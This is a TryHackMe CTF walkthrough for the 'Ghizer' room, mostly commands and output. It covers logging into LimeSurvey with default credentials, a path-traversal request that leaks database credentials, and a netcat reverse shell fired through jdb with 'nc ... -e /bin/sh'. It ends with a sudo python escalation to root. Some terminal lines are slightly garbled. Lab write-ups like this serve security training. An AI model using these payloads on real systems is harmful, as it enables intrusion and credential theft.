@@ -1,0 +1,215 @@
+Ghizer Tryhackme Walkthrough.
+
+Nmap scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Ghizer# nmap -A -T4  10.10.28.59 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 18:46 IST
+Nmap scan report for 10.10.28.59
+Host is up (0.17s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
+|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
+|     Please login with USER and PASS.
+|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
+80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: LimeSurvey http://www.limesurvey.org
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title:         LimeSurvey    
+443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 5.4.2
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Ghizer &#8211; Just another WordPress site
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-07-23T17:27:31
+|_Not valid after:  2030-07-21T17:27:31
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+
+
+     Notice to developers :
+
+
+        If you turn debug mode on, the asset manager will be off.
+        If you turn degug mode off, the asset manager will be on.
+
+        Without the asset manager, the CSS/JS files are published from their real url (eg: http://yourlimesurvey.url/scripts/admin/admin_core.js)
+        So, once a browser loaded once those files, it cache it, and don't load it anymore.
+        Then, if you change some css/js files, final user must clean its browser cache to get the new version of the cache.
+        This was the old LS behaviour, if debug mode is on, you'll have this very behaviour
+
+        The asset manager resolve the browser cache problem. It copy the css/js files to a tmp directory before publishing it:
+        http://yourlimesurvey.url/tmp/assets/e929b9d4/admin_core.js
+
+        For admin GUI, the asset manager works on a base of a "file by file" : each single css/js file is published as a single asset.
+        So if you touch any css/js file published via the asset (updating its date of modification), the asset manager will AUTOMATICALLY create a new tmp directory:
+        http://yourlimesurvey.url/tmp/assets/eb139b88/admin_core.js
+
+        Then, the browser will automatically reload the file, and the final user don't need to refresh its cache.
+        You should never have to delete the tmp/assets directory. You can do it to free some space on your server, but that all.
+
+        notice: the css/js files from third party extension use the package system. It means that the asset manager will publish them on the base of the directory logic.
+        So, if you update any css/js file from a third party extension, make sure that the modification date of the root directory is updated.
+    -->
+
+
+http://10.10.28.59/index.php/admin
+
+After using default username as admin and password as password
+I was able to get into the admin panel..
+
+Lets see what we can do.
+
+
+Limesurvey online manual
+Support this project - Donate to LimeSurvey!
+LimeSurvey
+Version 3.15.9
+
+So lets search for any vulnerable version of LimeSurvey.
+
+https://www.secsignal.org/en/news/cve-2019-9960-arbitrary-file-download-in-limesurvey/
+
+You can read about this vulnerability.
+
+When a user exports the structure of a survey to *.lss format, a modal is generated with the “Download archive” button.
+
+
+This function receives as argument the value of the parameter “sZip“, as you can see in the code the parameter is not correctly sanitized before a Directory Traversal, so it is possible to access any type of internal files on the server.
+
+
+GET /index.php/admin/export/sa/downloadZip/?sZip=../application/config/config.php HTTP/1.1
+Host: 10.10.110.188
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.110.188/index.php/admin/survey/sa/listsurveys
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=6gviis04e72megidc5eok3qar7; YII_CSRF_TOKEN=YW9QSmIzTDZpOXF6UzJMUjh1WXpLQ3gwbkdKck1sdTSeohLUmL_rHaz7wIAfGWGjudpPwgQz1p7WMXyCPPxqWQ%3D%3D
+Connection: close
+
+We can use this to read the config file.
+			'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
+			'emulatePrepare' => true,
+			'username' => 'Anny',
+			'password' => 'P4$W0RD!!#S3CUr3!',
+			'charset' => 'utf8mb4',
+			'tablePrefix' => 'lime_',
+		),
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.110.188 55228
+Linux ubuntu 4.15.0-112-generic #113~16.04.1-Ubuntu SMP Fri Jul 10 04:37:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 07:45:10 up 27 min,  1 user,  load average: 0.09, 0.08, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+veronica tty7     :0               07:17   27:29   9.97s  0.13s /sbin/upstart --user
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+As we cant read the user.txt and for that we have to be veronica.
+We have to escalate our privileges from ww-data to veronica.
+We can do that:
+
+jdb -attach 127.0.0.1:18001 
+
+Type this and then type classpath followed by classes.
+
+stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
+
+THen write this command and set up netcat listener.
+
+print new java.lang.Runtime().exec("nc 10.9.81.62 1222 -e /bin/sh")
+
+root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1222
+Listening on 0.0.0.0 1222
+Connection received on 10.10.110.188 60894
+id
+uid=1000(veronica) gid=1000(veronica) groups=1000(veronica),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+
+And now we are veronica.
+
+veronica@ubuntu:~$ cat base.py
+cat base.py
+import base64
+
+hijackme = base64.b64encode(b'tryhackme is the best')
+print(hijackme)
+
+veronica@ubuntu:~$ rm base.py
+rm base.py
+rm: remove write-protected regular file 'base.py'? t
+t
+veronica@ubuntu:~$ ls
+ls
+base.py  Documents  examples.desktop  Music     Public       Templates  Videos
+Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
+veronica@ubuntu:~$ rm base.py
+rm base.py
+rm: remove write-protected regular file 'base.py'? y
+y
+veronica@ubuntu:~$ ls
+ls
+Desktop    Downloads         ghidra_9.0  Pictures  __pycache__  user.txt
+Documents  examples.desktop  Music       Public    Templates    Videos
+veronica@ubuntu:~$ echo 'import os;os.system("/bin/bash")' > base.py
+echo 'import os;os.system("/bin/bash")' > base.py
+veronica@ubuntu:~$ ls
+ls
+base.py  Documents  examples.desktop  Music     Public       Templates  Videos
+Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
+
+
+veronica@ubuntu:~$ sudo -l
+sudo -l
+Matching Defaults entries for veronica on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User veronica may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
+
+
+cveronica@ubuntu:~$ at base.py
+cat base.py
+import os;os.system("/bin/bash")
+veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
+sudo /usr/bin/python3.5 /home/veronica/base.py
+root@ubuntu:~# id
+id
+cuid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~# d /root
+cd /root
+root@ubuntu:/root# ls -la
+ls -la
+total 32
+drwx------  5 root root 4096 Jul 23 16:28 .
+drwxr-xr-x 24 root root 4096 Jul 23 12:54 ..
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Feb 26  2019 .cache
+drwxr-xr-x  4 root root 4096 Jul 23 21:17 Lucrecia
+drwxr-xr-x  2 root root 4096 Jul 23 14:57 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   70 Jul 23 16:28 root.txt
+root@ubuntu:/root# cat root.txt
+cat root.txt
+THM{02########################99E10E975741B959F09BFCF077E11A1D9}
+root@ubuntu:/root#
+
+Wow that was easy.
+
+-Voker2311
